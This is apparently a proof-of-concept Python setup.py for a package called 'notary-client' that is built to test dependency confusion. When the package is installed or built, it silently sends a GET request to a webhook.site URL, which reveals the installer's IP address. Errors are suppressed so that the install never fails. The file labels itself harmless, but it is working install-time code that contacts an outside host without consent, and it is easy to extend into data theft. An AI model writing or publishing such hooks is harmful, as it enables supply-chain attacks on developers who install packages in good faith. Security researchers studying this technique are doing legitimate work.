from setuptools import setup
import urllib.request

# Your webhook.site URL (will show installer’s source IP)
BEACON_URL = "https://webhook.site/8e5fbb36-360e-4ca3-b3ee-77e937e1ddab"

def beacon_once():
    try:
        # Perform a simple GET request (no data sent)
        req = urllib.request.Request(BEACON_URL, method="GET")
        with urllib.request.urlopen(req, timeout=3):
            pass
    except Exception:
        # Ignore errors so install never breaks
        pass

# Trigger beacon at install/build time
beacon_once()

# Standard setup call
setup(
    name="notary-client",
    version="3.6.0",
    packages=["notary-client"],
    description="POC package (harmless beacon-only)",
)
